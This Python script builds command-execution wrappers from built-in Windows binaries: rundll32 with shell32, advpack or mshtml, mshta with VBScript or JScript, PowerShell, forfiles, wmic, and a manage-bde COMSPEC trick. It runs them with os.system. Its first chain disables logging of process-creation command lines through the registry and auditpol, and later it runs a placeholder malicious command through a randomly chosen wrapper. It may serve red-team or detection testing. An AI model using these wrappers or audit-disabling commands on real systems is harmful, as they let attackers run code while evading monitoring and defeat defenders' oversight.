import os
import secrets


def Shell32(cmd):
    return 'rundll32.exe SHELL32.DLL,ShellExec_RunDLL %s' % cmd


def Cmd(cmd):
    return 'cmd /c "%s"' % cmd


def Advpack(cmd):
    return 'rundll32 advpack.dll, RegisterOCX "cmd.exe /c %s & REM exe"' % cmd


def MSHTA_VB(cmd):
    return 'mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Exec(""%s"")"))' % cmd.replace('"', '""""')


def MSHTA_JS(cmd):
    return 'mshta.exe "javascript:new%%20ActiveXObject(\'WScript.Shell\').run(\'%s\');close();"' % cmd.replace('\\', '\\\\').replace('"', '\\"')


def MSHTML_VB(cmd):
    return 'rundll32.exe vbscript:"\..\mshtml,RunHTMLApplication "+Close(Execute("CreateObject(""WScript.Shell"").Exec(""%s"")"))' % cmd.replace('"', '""""')


def MSHTML_JS(cmd):
    return 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";new%%20ActiveXObject("WScript.Shell").run("%s");close();' % cmd.replace('\\', '\\\\').replace('"', '\\"')


def PowerShell(cmd):
    return 'powershell -c "%s"' % cmd.replace('"', '\\"')


def Forfiles(cmd):
    return 'forfiles /p c:\\windows\\system32 /m notepad.exe /c "%s"' % (cmd.split(' ')[0] + ' ' + cmd)


def Wmic(cmd):
    return 'wmic.exe process call create "%s"' % cmd


def ManageBDE(cmd):
    return 'set COMSPEC=c:\windows\system32\\cmd.exe /c "cmd.exe /c %s & REM" & cscript c:\windows\system32\manage-bde.wsf' % cmd


def RandomLOLBAS(cmd):
    LOLBAS = [Shell32, Cmd, Advpack, MSHTA_VB, MSHTML_VB,
              MSHTA_JS, MSHTML_JS, PowerShell, Forfiles, Wmic, ManageBDE]
    payload = secrets.choice(LOLBAS)
    return payload(cmd)


# LOLBAS Process Chain
cmd1 = 'reg add "hklm\software\microsoft\windows\currentversion\policies\system\\audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f'
cmd2 = 'Auditpol /set /subcategory:"建立處理程序" /success:disable /failure:disable'
payload = MSHTA_JS(cmd2)
payload = PowerShell("%s ; %s" % (cmd1, payload))
payload = Cmd(payload)
os.system(payload)

# Random LOLBAS
cmd1 = "cmd.exe /c echo malicious_cmd"
cmd2 = 'Auditpol /set /subcategory:"建立處理程序" /success:enable /failure:enable '
cmd3 = 'reg add "hklm\software\microsoft\windows\currentversion\policies\system\\audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f'

for cmd in [cmd1, cmd2, cmd3]:
    payload = RandomLOLBAS(cmd)
    os.system(payload)
